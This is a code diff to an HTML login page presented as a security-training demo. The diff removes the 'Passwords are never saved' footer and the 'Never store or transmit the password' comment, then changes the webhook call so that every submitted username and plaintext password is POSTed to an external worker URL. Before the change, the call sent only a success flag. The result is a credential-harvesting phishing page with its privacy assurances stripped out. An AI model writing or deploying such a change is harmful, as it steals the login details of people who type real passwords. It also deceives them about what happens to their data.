@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -45,16 +44,6 @@ h1 {
   color: #666;
   font-size: 14px;
   line-height: 1.6;
-}
-
-.notice {
-  background: #fffbe0;
-  border: 1px solid #e9dc80;
-  padding: 12px;
-  border-radius: 10px;
-  font-size: 12px;
-  text-align: center;
-  margin: 22px 0;
 }
 
 label {
@@ -122,6 +111,7 @@ input:focus {
   text-align: center;
   font-size: 14px;
   line-height: 1.5;
+  white-space: pre-wrap;
 }
 
 .hidden { display: none; }
@@ -217,7 +207,7 @@ input:focus {
       </button>
     </form>
 
-    <div class="result" id="result"></div>
+    <div class="result" id="localResult"></div>
 
     <button class="secondary" id="openDashboard">
       View Training Results
@@ -253,7 +243,7 @@ input:focus {
     </button>
 
     <div class="footer">
-      Passwords are never saved.
+      Lab Environment.
     </div>
   </section>
 
@@ -267,7 +257,6 @@ const WORKER_URL =
 
 const loginPage = document.getElementById("loginPage");
 const dashboard = document.getElementById("dashboard");
-const result = document.getElementById("result");
 const passwordInput = document.getElementById("password");
 
 function getAttempts() {
@@ -287,25 +276,38 @@ function saveAttempts(attempts) {
   );
 }
 
-function notifyDiscord(success) {
-  fetch(WORKER_URL, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      event: "demo_login",
-      success: success
-    })
-  })
-  .then(response => {
+async function sendDemoResult(username, password) {
+  const success = password === "Demo@12345";
+
+  // Show the entered password locally for the lab.
+  document.getElementById("localResult").textContent =
+    `Username: ${username}\n` +
+    `Password: ${password} (Demo Only)\n` +
+    `Result: ${success ? "Success" : "Wrong Password"}`;
+
+  document.getElementById("localResult").style.color = success ? "green" : "#b42318";
+
+  // Send credentials and outcome to Worker.
+  try {
+    const response = await fetch(WORKER_URL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        event: "demo_login",
+        username: username,
+        password: password,
+        success: success
+      })
+    });
+
     if (!response.ok) {
-      console.error("Discord notification failed");
+      console.error("Notification failed");
     }
-  })
-  .catch(error => {
-    console.error("Notification connection error:", error);
-  });
+  } catch (error) {
+    console.error("Connection error:", error);
+  }
 }
 
 document.getElementById("showPassword")
@@ -320,38 +322,21 @@ document.getElementById("loginForm")
   .addEventListener("submit", (event) => {
     event.preventDefault();
 
-    const username = document
-      .getElementById("username").value.trim();
-
+    const username = document.getElementById("username").value.trim();
     const password = passwordInput.value;
-
-    // Fixed dummy password used only for simulation.
     const success = password === "Demo@12345";
 
-    // Never store or transmit the password.
+    // Save attempt locally for dashboard
     const attempts = getAttempts();
     attempts.unshift({
       username,
       success,
       time: new Date().toLocaleString()
     });
-
     saveAttempts(attempts.slice(0, 100));
 
-    console.log("Security Training Event", {
-      event: "demo_login",
-      success: success,
-      time: new Date().toISOString()
-    });
-
-    // Send anonymous demo result to Discord.
-    notifyDiscord(success);
-
-    result.textContent = success
-      ? "Demo login successful!"
-      : "Demo login failed. Use the training password.";
-
-    result.style.color = success ? "green" : "#b42318";
+    // Send attempt details
+    sendDemoResult(username, password);
 
     passwordInput.value = "";
   });
